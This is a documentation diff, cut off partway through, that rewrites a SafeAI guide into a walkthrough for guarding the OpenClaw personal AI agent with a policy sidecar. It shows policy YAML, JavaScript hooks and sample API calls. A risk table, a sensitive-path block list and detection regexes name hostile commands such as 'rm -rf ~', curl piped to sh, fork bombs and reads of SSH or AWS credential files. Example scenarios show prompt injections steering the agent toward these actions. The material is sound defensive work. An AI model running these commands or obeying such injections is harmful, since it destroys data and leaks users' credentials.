@@ -1,87 +1,152 @@
-# Use Case: OpenClaw Legal AI Platform
+# Securing OpenClaw with SafeAI
 
-This walkthrough builds a production-ready AI legal assistant using SafeAI. OpenClaw is a fictional legal-tech startup that deploys AI agents to help attorneys draft contracts, search case law, and communicate with clients. Every boundary — input, output, tool call, agent message — is enforced by SafeAI.
+[OpenClaw](https://openclaw.ai/) is an open-source personal AI assistant that runs locally on your machine. It connects to WhatsApp, Telegram, Slack, Discord, Signal, iMessage, and more — executing real actions like browsing the web, running shell commands, reading and writing files, sending emails via Gmail, and managing GitHub repos.
 
-By the end of this guide you will have configured and exercised every major SafeAI feature in a single, realistic application.
+That power is exactly why it needs SafeAI. An autonomous agent with shell access, file system permissions, and messaging capabilities is one prompt injection away from leaking credentials, sending PII to the wrong chat, or running `rm -rf` on your home directory.
 
----
-
-## The scenario
-
-OpenClaw runs three AI agents:
-
-| Agent | Role | Tools | Risk profile |
-|:---|:---|:---|:---|
-| `drafter` | Drafts contract clauses from templates | `search_templates`, `generate_clause` | Medium — accesses client names |
-| `researcher` | Searches case law databases | `search_cases`, `fetch_ruling` | Low — reads public records |
-| `reviewer` | Reviews drafts and communicates with attorneys | `send_email`, `flag_risk` | High — handles PII, sends external email |
-
-The security requirements:
-
-- No API keys or credentials may reach any LLM
-- Client PII (names, emails, phone numbers) must be redacted in all outputs
-- The `send_email` tool requires human approval before execution
-- Only `reviewer` may use the `send_email` tool
-- Agent-to-agent messages are scanned for sensitive data
-- Every decision is audit-logged and queryable
-- Secrets (API keys for case law DB) are accessed via scoped capability tokens
-- Drafts stored in agent memory are encrypted with auto-expiry
+This guide shows how to run SafeAI as a sidecar alongside OpenClaw so every tool call, every outbound message, and every model response is scanned and enforced — without modifying OpenClaw's source code.
 
 ---
 
-## Step 1 — Install and scaffold
+## Why OpenClaw needs guardrails
+
+OpenClaw's agent can:
+
+| Capability | Risk |
+|:---|:---|
+| Execute shell commands (`bash`) | `rm -rf ~`, `curl ... \| sh`, credential exfil |
+| Read/write files | Access `.env`, `~/.ssh/id_rsa`, `~/.aws/credentials` |
+| Browse the web (Playwright/CDP) | Navigate to phishing pages, leak session cookies |
+| Send messages (WhatsApp, Telegram, Slack, etc.) | Forward PII or secrets to unintended recipients |
+| Gmail Pub/Sub integration | Read/send email with your real inbox |
+| GitHub integration | Push code, create repos, expose tokens |
+| Cron jobs and webhooks | Persistent backdoor tasks |
+
+A single prompt injection — via an incoming DM, a webpage the agent visits, or a file it reads — could exploit any of these. SafeAI sits between OpenClaw and these tools to enforce policy at every boundary.
+
+---
+
+## Architecture
+
+OpenClaw is a Node.js/TypeScript application. SafeAI is Python. The integration uses SafeAI's **REST proxy** running as a sidecar — OpenClaw calls SafeAI's HTTP API before and after tool execution.
+
+```
+                         ┌─────────────────┐
+  User (WhatsApp,        │                 │        ┌──────────────┐
+  Telegram, Slack,  ───> │    OpenClaw      │ ─────> │  AI Provider │
+  Discord, etc.)         │    Gateway       │ <───── │  (Claude,    │
+                         │  ws://127.0.0.1  │        │   OpenAI)    │
+                         │     :18789       │        └──────────────┘
+                         │                 │
+                         │   Tool calls ────┼──────> ┌──────────────┐
+                         │   (bash, file,   │        │   SafeAI     │
+                         │    browser,      │ <───── │   Sidecar    │
+                         │    messaging)    │        │  :8484       │
+                         └─────────────────┘        └──────────────┘
+                                                         │
+                                                    Policy Engine
+                                                    Audit Logger
+                                                    Secret Scanner
+                                                    PII Detector
+```
+
+SafeAI runs on `localhost:8484`. OpenClaw calls it via HTTP before executing any tool and after receiving any model response.
+
+---
+
+## Step 1 — Install both
 
 ```bash
+# Install OpenClaw
+npm install -g openclaw@latest
+openclaw onboard --install-daemon
+
+# Install SafeAI
 uv pip install safeai
+
+# Scaffold SafeAI config in your workspace
+cd ~/openclaw-workspace
 safeai init --path .
 ```
 
-This creates the config directory. Now replace the defaults with OpenClaw's configuration.
-
 ---
 
-## Step 2 — Configure policies
+## Step 2 — Configure SafeAI policies for OpenClaw
+
+Replace the default policies with rules tailored to an autonomous personal assistant.
 
 ```yaml title="policies/openclaw.yaml"
 policies:
-  # Secrets are blocked everywhere — highest priority
-  - name: block-secrets
+  # ── SECRETS ─────────────────────────────────────────
+  # Block secrets at every boundary. This is the most critical rule.
+  - name: block-secrets-everywhere
     boundary: [input, action, output]
     priority: 10
     condition:
       data_tags: [secret]
     action: block
-    reason: "Credentials must never cross any boundary."
+    reason: "Credentials, API keys, and tokens must never cross any boundary."
 
-  # PII is redacted in outputs
-  - name: redact-pii-output
+  # ── PII ─────────────────────────────────────────────
+  # Block PII from reaching the model
+  - name: block-pii-to-model
+    boundary: [input]
+    priority: 20
+    condition:
+      data_tags: [personal.pii]
+    action: block
+    reason: "PII must not be sent to the model."
+
+  # Redact PII in model responses
+  - name: redact-pii-in-responses
     boundary: [output]
     priority: 20
     condition:
       data_tags: [personal.pii]
     action: redact
-    reason: "Client PII must be redacted before leaving the system."
+    reason: "PII must be redacted before displaying to the user."
 
-  # PII is blocked in inputs to the LLM
-  - name: block-pii-input
-    boundary: [input]
-    priority: 25
+  # ── DANGEROUS COMMANDS ──────────────────────────────
+  # Block destructive shell commands (rm -rf, DROP TABLE, etc.)
+  - name: block-dangerous-commands
+    boundary: [action]
+    priority: 15
     condition:
-      data_tags: [personal.pii]
+      data_tags: [destructive]
     action: block
-    reason: "Client PII must not be sent to the model."
+    reason: "Destructive commands are not allowed."
 
-  # Destructive or external-facing tools require approval
-  - name: approve-external-actions
+  # ── EXTERNAL ACTIONS ────────────────────────────────
+  # Require human approval for messaging and email
+  - name: approve-outbound-messages
     boundary: [action]
     priority: 30
     condition:
-      data_tags: [external, destructive]
+      data_tags: [external.messaging]
     action: require_approval
-    reason: "External-facing actions require attorney approval."
+    reason: "Outbound messages require user approval."
 
-  # Default allow
-  - name: allow-remaining
+  # Require approval for git push and GitHub operations
+  - name: approve-git-push
+    boundary: [action]
+    priority: 30
+    condition:
+      data_tags: [external.git]
+    action: require_approval
+    reason: "Git push operations require user approval."
+
+  # ── FILE SYSTEM ─────────────────────────────────────
+  # Block access to sensitive file paths
+  - name: block-sensitive-files
+    boundary: [action]
+    priority: 12
+    condition:
+      data_tags: [sensitive.filesystem]
+    action: block
+    reason: "Access to credential files and private keys is denied."
+
+  # ── DEFAULT ALLOW ───────────────────────────────────
+  - name: allow-everything-else
     boundary: [input, action, output]
     priority: 1000
     condition: {}
@@ -91,611 +156,617 @@ policies:
 
 ---
 
-## Step 3 — Define tool contracts
+## Step 3 — Define tool contracts for OpenClaw's capabilities
 
 ```yaml title="contracts/openclaw.yaml"
 contracts:
-  - tool_name: search_templates
+  # Shell execution — most dangerous tool
+  - tool_name: bash
     allowed_request_tags: [internal]
-    allowed_response_fields: [template_id, title, body]
+    allowed_response_fields: [stdout, stderr, exit_code]
 
-  - tool_name: generate_clause
+  # File operations
+  - tool_name: file_read
     allowed_request_tags: [internal]
-    allowed_response_fields: [clause_text, clause_id, warnings]
+    allowed_response_fields: [content, path, size]
 
-  - tool_name: search_cases
+  - tool_name: file_write
     allowed_request_tags: [internal]
-    allowed_response_fields: [case_id, title, citation, summary]
+    allowed_response_fields: [path, bytes_written, status]
 
-  - tool_name: fetch_ruling
+  # Browser automation
+  - tool_name: browser
     allowed_request_tags: [internal]
-    allowed_response_fields: [case_id, ruling_text, date, court]
+    allowed_response_fields: [url, title, content, screenshot]
 
-  - tool_name: send_email
-    allowed_request_tags: [external, personal.pii]
+  # Messaging (WhatsApp, Telegram, Slack, etc.)
+  - tool_name: send_message
+    allowed_request_tags: [external.messaging, personal.pii]
+    allowed_response_fields: [message_id, status, channel]
+
+  # Gmail
+  - tool_name: gmail_send
+    allowed_request_tags: [external.messaging, personal.pii]
     allowed_response_fields: [message_id, status]
 
-  - tool_name: flag_risk
+  # GitHub
+  - tool_name: github_push
+    allowed_request_tags: [external.git]
+    allowed_response_fields: [commit_sha, branch, status]
+
+  # Cron / webhooks
+  - tool_name: cron_create
     allowed_request_tags: [internal]
-    allowed_response_fields: [risk_id, severity, description]
-```
-
-!!! note
-    `send_email` explicitly allows `personal.pii` in its request tags because it needs the recipient's email address. But the policy engine still requires human approval for the `external` tag before the tool executes.
-
----
-
-## Step 4 — Define agent identities
-
-```yaml title="agents/openclaw.yaml"
-agents:
-  - agent_id: drafter
-    allowed_tools: [search_templates, generate_clause]
-    clearance_tags: [internal]
-
-  - agent_id: researcher
-    allowed_tools: [search_cases, fetch_ruling]
-    clearance_tags: [internal]
-
-  - agent_id: reviewer
-    allowed_tools: [send_email, flag_risk, search_templates, generate_clause]
-    clearance_tags: [internal, external, personal.pii]
-```
-
-Only `reviewer` has clearance for `external` and `personal.pii` tags. If `drafter` tries to call `send_email`, SafeAI blocks it before the function runs.
-
----
-
-## Step 5 — Define memory schemas
-
-```yaml title="schemas/memory.yaml"
-schemas:
-  - field: draft_text
-    type: string
-    retention: 24h
-    encrypted: true
-
-  - field: client_name
-    type: string
-    retention: 1h
-    encrypted: true
-
-  - field: session_notes
-    type: string
-    retention: 7d
-    encrypted: false
-```
-
-Draft text and client names are encrypted at rest with automatic expiry. Session notes are retained for a week but not encrypted since they contain no PII.
-
----
-
-## Step 6 — Initialize SafeAI in Python
-
-```python title="openclaw/runtime.py"
-from safeai import SafeAI
-
-# Load all config: policies, contracts, identities, memory schemas
-ai = SafeAI.from_config("safeai.yaml")
-```
-
-That single line assembles the full policy engine, contract registry, identity registry, approval manager, memory controller, and audit logger.
-
----
-
-## Step 7 — Input scanning
-
-Every prompt from an attorney goes through `scan_input` before reaching the LLM.
-
-```python title="openclaw/chat.py"
-def handle_attorney_message(message: str, agent_id: str = "drafter") -> str:
-    # Scan for secrets and PII before the message reaches the model
-    scan = ai.scan_input(message, agent_id=agent_id)
-
-    if scan.decision.action == "block":
-        return f"Blocked: {scan.decision.reason}"
-
-    # Safe to forward to the LLM
-    response = call_llm(scan.filtered)
-
-    # Guard the response before showing it to the attorney
-    guard = ai.guard_output(response, agent_id=agent_id)
-    return guard.safe_output
-```
-
-**What happens:**
-
-```python
-# Secret detected — blocked at the input boundary
-handle_attorney_message("Use API key sk-live-abc123 to access the DB")
-# => "Blocked: Credentials must never cross any boundary."
-
-# PII detected — blocked at the input boundary
-handle_attorney_message("Draft a clause for alice@acme.com")
-# => "Blocked: Client PII must not be sent to the model."
-
-# Clean input — allowed through
-handle_attorney_message("Draft a non-compete clause for a SaaS company")
-# => "The following non-compete clause is recommended for SaaS agreements..."
+    allowed_response_fields: [job_id, schedule, status]
 ```
 
 ---
 
-## Step 8 — Output guarding
-
-Even when inputs are clean, the LLM may hallucinate PII or reproduce memorized data.
-
-```python
-# The model hallucinates a phone number in its response
-response = "Contact the client at 555-867-5309 for signature."
-guard = ai.guard_output(response, agent_id="reviewer")
-
-print(guard.safe_output)
-# => "Contact the client at [REDACTED] for signature."
-
-print(guard.decision.action)
-# => "redact"
-```
-
----
-
-## Step 9 — Tool interception with contracts
-
-Every tool call passes through the action boundary. SafeAI validates the request against the tool's contract, checks the agent's identity and clearance, and filters the response.
-
-```python title="openclaw/tools.py"
-def search_templates(query: str) -> dict:
-    """Search the template database."""
-    return {
-        "template_id": "tmpl-42",
-        "title": "SaaS Non-Compete",
-        "body": "The Employee agrees not to...",
-        "internal_score": 0.95,  # internal field — not in contract
-    }
-
-
-# Intercept the request
-request_result = ai.intercept_tool_request(
-    tool_name="search_templates",
-    parameters={"query": "non-compete SaaS"},
-    data_tags=["internal"],
-    agent_id="drafter",
-)
-
-print(request_result.decision.action)
-# => "allow"
-
-# Execute the tool
-raw_response = search_templates("non-compete SaaS")
-
-# Intercept the response — strips fields not in the contract
-response_result = ai.intercept_tool_response(
-    tool_name="search_templates",
-    response=raw_response,
-    agent_id="drafter",
-    request_data_tags=["internal"],
-)
-
-print(response_result.filtered_response)
-# => {"template_id": "tmpl-42", "title": "SaaS Non-Compete", "body": "The Employee agrees not to..."}
-# Note: "internal_score" is stripped — it's not in allowed_response_fields
-
-print(response_result.stripped_fields)
-# => ["internal_score"]
-```
-
----
-
-## Step 10 — Agent identity enforcement
-
-The `drafter` agent tries to call `send_email` — a tool it's not authorized to use.
-
-```python
-result = ai.intercept_tool_request(
-    tool_name="send_email",
-    parameters={"to": "attorney@firm.com", "body": "Draft ready for review."},
-    data_tags=["external"],
-    agent_id="drafter",  # drafter is NOT allowed to use send_email
-)
-
-print(result.decision.action)
-# => "block"
-print(result.decision.reason)
-# => "Agent 'drafter' is not authorized for tool 'send_email'"
-```
-
-Only `reviewer` can call `send_email`:
-
-```python
-result = ai.intercept_tool_request(
-    tool_name="send_email",
-    parameters={"to": "attorney@firm.com", "body": "Draft ready for review."},
-    data_tags=["external"],
-    agent_id="reviewer",
-)
-
-print(result.decision.action)
-# => "require_approval" (because data_tags include "external")
-```
-
----
-
-## Step 11 — Human approval workflow
-
-The `send_email` call was tagged `external`, so the policy engine returns `require_approval`. SafeAI creates an approval request that an attorney must review.
-
-```python
-# List pending approvals
-pending = ai.list_approval_requests(status="pending")
-for req in pending:
-    print(f"[{req.request_id}] {req.tool_name} by {req.agent_id}: {req.reason}")
-
-# Attorney approves the request
-ai.approve_request(
-    pending[0].request_id,
-    approver_id="attorney-jane",
-    note="Reviewed draft, safe to send.",
-)
-
-# Now retry the tool call with the approved request ID
-result = ai.intercept_tool_request(
-    tool_name="send_email",
-    parameters={"to": "attorney@firm.com", "body": "Draft ready for review."},
-    data_tags=["external"],
-    agent_id="reviewer",
-    approval_request_id=pending[0].request_id,
-)
-
-print(result.decision.action)
-# => "allow"
-```
-
-From the CLI:
+## Step 4 — Start SafeAI sidecar
 
 ```bash
-# List pending approvals
-safeai approvals list --status pending
-
-# Approve
-safeai approvals approve req_abc123 --approver attorney-jane --note "Approved"
-
-# Deny
-safeai approvals deny req_def456 --approver attorney-jane --note "Draft needs revision"
+safeai serve --mode sidecar --port 8484 --config safeai.yaml
 ```
+
+SafeAI is now running at `http://127.0.0.1:8484` and ready to enforce policies.
 
 ---
 
-## Step 12 — Capability tokens for secret access
+## Step 5 — Build the OpenClaw SafeAI skill
 
-The `researcher` agent needs an API key to query the case law database. Instead of giving the agent the raw key, SafeAI issues a scoped, time-limited capability token.
+OpenClaw uses a **skills** system for extensibility. Create a SafeAI skill that intercepts tool calls via the sidecar API.
 
-```python
-# Issue a token scoped to researcher + search_cases, valid for 10 minutes
-token = ai.issue_capability_token(
-    agent_id="researcher",
-    tool_name="search_cases",
-    actions=["invoke"],
-    ttl="10m",
-    secret_keys=["CASELAW_API_KEY"],
-)
+```javascript title="skills/safeai-guard/index.js"
+// SafeAI Guard — OpenClaw skill that enforces SafeAI policies
+// on every tool call, inbound message, and model response.
 
-print(token.token_id)
-# => "cap_a1b2c3..."
+const SAFEAI_URL = process.env.SAFEAI_URL || "http://127.0.0.1:8484";
 
-# Resolve the secret using the token
-import os
-os.environ["CASELAW_API_KEY"] = "real-api-key-here"
-
-resolved = ai.resolve_secret(
-    token_id=token.token_id,
-    secret_key="CASELAW_API_KEY",
-    agent_id="researcher",
-    tool_name="search_cases",
-)
-
-print(resolved.value)
-# => "real-api-key-here"
-
-# If drafter tries to use the same token — denied
-try:
-    ai.resolve_secret(
-        token_id=token.token_id,
-        secret_key="CASELAW_API_KEY",
-        agent_id="drafter",  # wrong agent
-        tool_name="search_cases",
-    )
-except Exception as e:
-    print(e)
-    # => "Capability token not valid for agent 'drafter'"
-```
-
-Tokens auto-expire after their TTL. Revoke early if needed:
-
-```python
-ai.revoke_capability_token(token.token_id)
-ai.purge_expired_capability_tokens()
-```
-
----
-
-## Step 13 — Encrypted agent memory
-
-The `drafter` agent stores work-in-progress drafts in encrypted memory.
-
-```python
-# Store a draft — encrypted at rest, auto-expires in 24h
-ai.memory_write("draft_text", "The Employee agrees not to...", agent_id="drafter")
-
-# Read it back
-draft = ai.memory_read("draft_text", agent_id="drafter")
-print(draft)
-# => "The Employee agrees not to..."
-
-# Store client name — encrypted, expires in 1h
-ai.memory_write("client_name", "Alice Johnson", agent_id="drafter")
-
-# After 1 hour, the field is automatically purged
-# Or purge manually:
-purged = ai.memory_purge_expired()
-print(f"Purged {purged} expired entries")
-```
-
-Memory handles let you share encrypted references between agents without exposing the raw value:
-
-```python
-# Resolve an encrypted memory handle (policy-gated)
-value = ai.resolve_memory_handle("handle_draft_001", agent_id="reviewer")
-```
-
----
-
-## Step 14 — Agent-to-agent messaging
-
-When `drafter` sends a completed draft to `reviewer`, the message crosses a trust boundary and is scanned for sensitive content.
-
-```python
-result = ai.intercept_agent_message(
-    message="Draft complete. Client Alice Johnson (alice@acme.com) approved the terms.",
-    source_agent_id="drafter",
-    destination_agent_id="reviewer",
-    session_id="session-42",
-)
-
-print(result["decision"]["action"])
-# => "block" or "redact" depending on policy
-# The message contains PII (email, name) — policy decides what to do
-
-print(result["data_tags"])
-# => ["personal.pii"]
-
-print(result["filtered_message"])
-# => "" (blocked) or "[REDACTED]" (redacted)
-```
-
-!!! tip
-    Design agent-to-agent messages to pass references (IDs, handle keys) instead of raw PII. SafeAI enforces this pattern by scanning every message.
-
----
-
-## Step 15 — Structured payload scanning
-
-When the `drafter` agent receives a complex JSON payload from an integration, SafeAI scans every nested field.
-
-```python
-payload = {
-    "client": {
-        "name": "Alice Johnson",
-        "email": "alice@acme.com",
-        "phone": "555-867-5309",
-    },
-    "contract": {
-        "type": "non-compete",
-        "jurisdiction": "Delaware",
-    },
+/**
+ * Scan text before it reaches the model (input boundary).
+ */
+async function scanInput(text, agentId = "openclaw") {
+  const res = await fetch(`${SAFEAI_URL}/v1/scan/input`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ text, agent_id: agentId }),
+  });
+  return res.json();
 }
 
-result = ai.scan_structured_input(payload, agent_id="drafter")
+/**
+ * Guard model output before displaying to user (output boundary).
+ */
+async function guardOutput(text, agentId = "openclaw") {
+  const res = await fetch(`${SAFEAI_URL}/v1/guard/output`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ text, agent_id: agentId }),
+  });
+  return res.json();
+}
 
-print(result.decision.action)
-# => "block" (PII found in nested fields)
+/**
+ * Intercept a tool call before execution (action boundary).
+ */
+async function interceptTool(toolName, params, dataTags, agentId = "openclaw") {
+  const res = await fetch(`${SAFEAI_URL}/v1/intercept/tool`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({
+      tool_name: toolName,
+      parameters: params,
+      data_tags: dataTags,
+      agent_id: agentId,
+    }),
+  });
+  return res.json();
+}
 
-for detection in result.detections:
-    print(f"  {detection.path}: {detection.tag} ({detection.detector})")
-# => client.name: personal.pii (name_detector)
-# => client.email: personal.pii (email_detector)
-# => client.phone: personal.pii (phone_detector)
-```
+/**
+ * Scan a structured JSON payload (e.g., webhook data).
+ */
+async function scanStructured(payload, agentId = "openclaw") {
+  const res = await fetch(`${SAFEAI_URL}/v1/scan/structured`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ payload, agent_id: agentId }),
+  });
+  return res.json();
+}
 
-File scanning works the same way:
-
-```python
-result = ai.scan_file_input("intake_form.json", agent_id="drafter")
-print(result["decision"]["action"])
+module.exports = { scanInput, guardOutput, interceptTool, scanStructured };
 ```
 
 ---
 
-## Step 16 — Audit trail
+## Step 6 — Wire SafeAI into OpenClaw's tool pipeline
 
-Every decision SafeAI makes is logged. Query the audit trail to investigate incidents or generate compliance reports.
+Create a wrapper that checks SafeAI before every tool executes. This is the core integration point.
 
-```python
-# All blocked events in the last hour
-blocked = ai.query_audit(action="block", since="1h")
-for event in blocked:
-    print(f"[{event['boundary']}] {event['reason']} (agent={event['agent_id']})")
+```javascript title="skills/safeai-guard/hooks.js"
+const { scanInput, guardOutput, interceptTool } = require("./index");
 
-# All decisions for a specific agent
-drafter_events = ai.query_audit(agent_id="drafter", limit=50)
+// ── Sensitive file paths that should never be read or written ──
+const SENSITIVE_PATHS = [
+  ".env", ".env.local", ".env.production",
+  ".ssh/", ".aws/credentials", ".gnupg/",
+  ".config/gh/hosts.yml", ".npmrc", ".pypirc",
+  ".netrc", "id_rsa", "id_ed25519",
+];
 
-# All approval-related events
-approvals = ai.query_audit(action="require_approval", boundary="action")
+function isSensitivePath(filepath) {
+  const normalized = filepath.replace(/^~\//, "").toLowerCase();
+  return SENSITIVE_PATHS.some(
+    (p) => normalized.includes(p) || normalized.endsWith(p)
+  );
+}
+
+// ── Tag inference based on tool name and parameters ──
+function inferTags(toolName, params) {
+  const tags = [];
+
+  // Messaging tools
+  if (["send_message", "gmail_send"].includes(toolName)) {
+    tags.push("external.messaging");
+    // Check if PII is in the message body
+    if (params.body || params.text || params.content) {
+      tags.push("personal.pii"); // SafeAI will scan and confirm
+    }
+  }
+
+  // Git operations
+  if (toolName === "github_push" || (toolName === "bash" && /git\s+push/.test(params.command))) {
+    tags.push("external.git");
+  }
+
+  // Destructive commands
+  if (toolName === "bash") {
+    const cmd = (params.command || "").toLowerCase();
+    if (
+      /rm\s+(-rf?|--recursive)/.test(cmd) ||
+      /drop\s+(table|database)/i.test(cmd) ||
+      /mkfs\./.test(cmd) ||
+      /:\(\)\s*\{/.test(cmd) ||        // fork bomb
+      /curl.*\|\s*(ba)?sh/.test(cmd) ||  // pipe to shell
+      /wget.*\|\s*(ba)?sh/.test(cmd)
+    ) {
+      tags.push("destructive");
+    }
+  }
+
+  // Sensitive file access
+  if (["file_read", "file_write"].includes(toolName)) {
+    if (isSensitivePath(params.path || "")) {
+      tags.push("sensitive.filesystem");
+    }
+  }
+
+  // Default to internal if no external tags
+  if (tags.length === 0) {
+    tags.push("internal");
+  }
+
+  return tags;
+}
+
+/**
+ * Pre-tool hook: runs BEFORE OpenClaw executes any tool.
+ * Returns { allowed: bool, reason: string, filtered_params: object }
+ */
+async function beforeToolExecution(toolName, params) {
+  const tags = inferTags(toolName, params);
+  const result = await interceptTool(toolName, params, tags);
+  const decision = result.decision || {};
+
+  if (decision.action === "block") {
+    return {
+      allowed: false,
+      reason: `SafeAI blocked ${toolName}: ${decision.reason}`,
+      filtered_params: params,
+    };
+  }
+
+  if (decision.action === "require_approval") {
+    return {
+      allowed: false,
+      reason: `SafeAI requires approval for ${toolName}: ${decision.reason}. `
+        + `Run: safeai approvals list --status pending`,
+      filtered_params: params,
+    };
+  }
+
+  return {
+    allowed: true,
+    reason: "allowed",
+    filtered_params: result.filtered_params || params,
+  };
+}
+
+/**
+ * Pre-model hook: scans inbound messages before the model sees them.
+ */
+async function beforeModelCall(userMessage) {
+  const result = await scanInput(userMessage);
+  const decision = result.decision || {};
+
+  if (decision.action === "block") {
+    return {
+      allowed: false,
+      reason: `SafeAI blocked input: ${decision.reason}`,
+      filtered: result.filtered || userMessage,
+    };
+  }
+
+  return {
+    allowed: true,
+    reason: "allowed",
+    filtered: result.filtered || userMessage,
+  };
+}
+
+/**
+ * Post-model hook: guards model output before displaying to user.
+ */
+async function afterModelCall(modelResponse) {
+  const result = await guardOutput(modelResponse);
+  return {
+    safe_output: result.safe_output || modelResponse,
+    action: (result.decision || {}).action || "allow",
+  };
+}
+
+module.exports = {
+  beforeToolExecution,
+  beforeModelCall,
+  afterModelCall,
+  inferTags,
+};
 ```
 
-From the CLI:
+---
+
+## Step 7 — See it in action
+
+Start both services:
 
 ```bash
-# Recent blocks
+# Terminal 1: SafeAI sidecar
+safeai serve --mode sidecar --port 8484 --config safeai.yaml
+
+# Terminal 2: OpenClaw
+openclaw start
+```
+
+### Scenario 1: Dangerous shell command blocked
+
+A user (or prompt injection) asks the agent to run a destructive command.
+
+```bash
+# From any connected channel (WhatsApp, Slack, etc.):
+> "Clean up disk space by running: rm -rf ~/*"
+```
+
+SafeAI intercepts the `bash` tool call:
+
+```json
+POST /v1/intercept/tool
+{
+  "tool_name": "bash",
+  "parameters": { "command": "rm -rf ~/*" },
+  "data_tags": ["destructive"],
+  "agent_id": "openclaw"
+}
+
+Response:
+{
+  "decision": {
+    "action": "block",
+    "policy_name": "block-dangerous-commands",
+    "reason": "Destructive commands are not allowed."
+  }
+}
+```
+
+The agent responds: *"I can't execute that command — it's been flagged as destructive by SafeAI."*
+
+### Scenario 2: Credential exfiltration blocked
+
+A prompt injection hidden in a webpage tells the agent to read your SSH key.
+
+```json
+POST /v1/intercept/tool
+{
+  "tool_name": "file_read",
+  "parameters": { "path": "~/.ssh/id_ed25519" },
+  "data_tags": ["sensitive.filesystem"],
+  "agent_id": "openclaw"
+}
+
+Response:
+{
+  "decision": {
+    "action": "block",
+    "policy_name": "block-sensitive-files",
+    "reason": "Access to credential files and private keys is denied."
+  }
+}
+```
+
+### Scenario 3: API key in inbound message blocked
+
+Someone sends you a message containing a secret, and the agent tries to forward it to the model.
+
+```json
+POST /v1/scan/input
+{
+  "text": "Hey, use this key: sk-proj-abc123def456 for the API",
+  "agent_id": "openclaw"
+}
+
+Response:
+{
+  "decision": {
+    "action": "block",
+    "policy_name": "block-secrets-everywhere",
+    "reason": "Credentials, API keys, and tokens must never cross any boundary."
+  }
+}
+```
+
+### Scenario 4: PII redacted in model response
+
+The model generates a response containing a phone number.
+
+```json
+POST /v1/guard/output
+{
+  "text": "I found your contact: John at 555-867-5309 and john@example.com",
+  "agent_id": "openclaw"
+}
+
+Response:
+{
+  "decision": { "action": "redact" },
+  "safe_output": "I found your contact: John at [REDACTED] and [REDACTED]"
+}
+```
+
+### Scenario 5: Outbound message requires approval
+
+The agent tries to send a WhatsApp message. The policy requires human approval.
+
+```json
+POST /v1/intercept/tool
+{
+  "tool_name": "send_message",
+  "parameters": {
+    "channel": "whatsapp",
+    "to": "+1-555-123-4567",
+    "body": "Here's the document you requested."
+  },
+  "data_tags": ["external.messaging"],
+  "agent_id": "openclaw"
+}
+
+Response:
+{
+  "decision": {
+    "action": "require_approval",
+    "policy_name": "approve-outbound-messages",
+    "reason": "Outbound messages require user approval."
+  }
+}
+```
+
+Approve from the CLI:
+
+```bash
+safeai approvals list --status pending
+safeai approvals approve req_abc123 --approver user --note "Looks good"
+```
+
+### Scenario 6: Git push requires approval
+
+```json
+POST /v1/intercept/tool
+{
+  "tool_name": "bash",
+  "parameters": { "command": "git push origin main" },
+  "data_tags": ["external.git"],
+  "agent_id": "openclaw"
+}
+
+Response:
+{
+  "decision": {
+    "action": "require_approval",
+    "reason": "Git push operations require user approval."
+  }
+}
+```
+
+---
+
+## Step 8 — Monitor with the audit trail
+
+Every decision is logged. Use the CLI to investigate.
+
+```bash
+# What did SafeAI block in the last hour?
 safeai logs --action block --last 1h
 
-# All events for the reviewer agent
-safeai logs --agent reviewer --tail 50
+# All tool interceptions
+safeai logs --boundary action --tail 50
 
-# Detailed view of a specific event
-safeai logs --detail evt_abc123 --text-output
+# Grep for destructive command attempts
+safeai logs --action block --last 24h --json-output | grep destructive
 
-# Export for compliance
-safeai logs --last 30d --json-output > compliance-report.jsonl
+# Export full audit trail for review
+safeai logs --last 7d --json-output > weekly-audit.jsonl
 ```
 
----
-
-## Step 17 — Framework adapter integration
-
-In production, OpenClaw uses LangChain for orchestration. SafeAI wraps every tool transparently.
-
-```python title="openclaw/agent.py"
-from safeai import SafeAI
-from safeai.middleware.langchain import SafeAIBlockedError
-
-ai = SafeAI.from_config("safeai.yaml")
-adapter = ai.langchain_adapter()
-
-
-def search_templates(query: str) -> dict:
-    return {"template_id": "tmpl-42", "title": "SaaS Non-Compete", "body": "..."}
-
-
-def send_email(to: str, body: str) -> dict:
-    return {"message_id": "msg-1", "status": "sent"}
-
-
-# Wrap tools — SafeAI intercepts every call automatically
-safe_search = adapter.wrap_tool(
-    "search_templates", search_templates,
-    agent_id="drafter",
-    request_data_tags=["internal"],
-)
-
-safe_email = adapter.wrap_tool(
-    "send_email", send_email,
-    agent_id="reviewer",
-    request_data_tags=["external", "personal.pii"],
-)
-
-# Use wrapped tools normally — SafeAI is invisible when things go right
-result = safe_search(query="non-compete SaaS")
-print(result)
-# => {"template_id": "tmpl-42", "title": "SaaS Non-Compete", "body": "..."}
-
-# Unauthorized call raises SafeAIBlockedError
-try:
-    safe_email(to="alice@acme.com", body="Draft ready")
-except SafeAIBlockedError as e:
-    print(f"Blocked: {e.reason}")
-    # => "Blocked: External-facing actions require attorney approval."
-```
-
-The same pattern works with CrewAI, AutoGen, Claude ADK, and Google ADK — swap `langchain_adapter()` for `crewai_adapter()`, `autogen_adapter()`, etc.
-
----
-
-## Step 18 — Proxy mode for non-Python services
-
-OpenClaw's document management system is written in Go. It calls SafeAI via the REST API.
+Or query via the API:
 
 ```bash
-safeai serve --mode sidecar --port 8000 --config safeai.yaml
-```
-
-```bash title="From the Go service"
-# Scan a prompt
-curl -s -X POST http://localhost:8000/v1/scan/input \
+curl -s -X POST http://127.0.0.1:8484/v1/audit/query \
   -H "content-type: application/json" \
-  -d '{"text": "Draft clause for alice@acme.com", "agent_id": "drafter"}'
-
-# Guard a response
-curl -s -X POST http://localhost:8000/v1/guard/output \
-  -H "content-type: application/json" \
-  -d '{"text": "Contact the client at 555-867-5309", "agent_id": "reviewer"}'
-
-# Query audit trail
-curl -s -X POST http://localhost:8000/v1/audit/query \
-  -H "content-type: application/json" \
-  -d '{"action": "block", "limit": 10}'
-
-# Check metrics
-curl -s http://localhost:8000/v1/metrics
+  -d '{"action": "block", "limit": 20}'
 ```
 
 ---
 
-## Step 19 — Coding agent integration
+## Step 9 — Structured payload scanning for webhooks
 
-OpenClaw developers use Claude Code to write contract templates. SafeAI hooks ensure no secrets leak during development.
+OpenClaw supports webhooks that receive JSON payloads from external services. Scan them before the agent processes them.
+
+```javascript
+const { scanStructured } = require("./skills/safeai-guard/index");
+
+// Incoming webhook from a CRM or form submission
+const webhookPayload = {
